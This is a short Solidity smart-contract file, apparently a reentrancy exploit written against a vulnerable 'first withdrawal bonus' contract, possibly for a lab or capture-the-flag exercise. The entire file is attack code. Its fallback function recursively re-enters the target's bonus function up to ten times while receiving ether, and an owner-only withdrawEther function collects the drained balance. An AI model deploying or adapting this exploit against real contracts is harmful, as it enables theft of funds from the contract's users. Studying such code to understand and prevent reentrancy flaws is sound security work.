pragma solidity ^0.4.24;

interface IReentrancyBonus {
    function getFirstWithdrawalBonus(address recipient) external;
}

contract ReentrancyExploit {
    IReentrancyBonus public vulnerableContract;
    address public owner;
    uint public attackCount;

    constructor(address _target) public {
        vulnerableContract = IReentrancyBonus(_target);
        owner = msg.sender;
    }

    // Fallback gets called during `call.value(...)` in withdrawReward
    function () external payable {
        if (attackCount < 10) { // Limit recursion to avoid out-of-gas
            attackCount++;
            vulnerableContract.getFirstWithdrawalBonus(address(this));
        }
    }

    function initiateAttack() external {
        attackCount = 0;
        vulnerableContract.getFirstWithdrawalBonus(address(this));
    }

    function withdrawEther() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

